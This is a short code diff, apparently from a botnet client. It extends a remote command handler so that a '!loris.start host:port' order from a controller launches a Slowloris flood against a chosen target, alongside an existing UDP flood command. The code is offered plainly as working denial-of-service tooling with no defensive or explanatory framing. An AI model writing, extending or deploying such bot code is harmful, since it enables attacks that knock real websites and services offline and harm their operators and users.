@@ -21,7 +21,13 @@ def handle_commands(command):
             addr = options[1].split(':')
             target  = addr[0]
             port    = addr[1]
-            udp._flood(target,port)
+            udp.flood(target,port)
+        elif "!loris.start" in command:
+            options = command.split(' ')
+            addr = options[1].split(':')
+            target  = addr[0]
+            port    = addr[1]
+            slowloris.flood(target,port)    
         else:
             pass
     except:
@@ -31,7 +37,7 @@ def receive_commands(client_socket):
     while True:
         try:
             command = client_socket.recv(BUFFER_SIZE)
-            Thread(target=handle_commands, args=(command,)).start()
+            handle_commands(command)
         except:
             pass
 
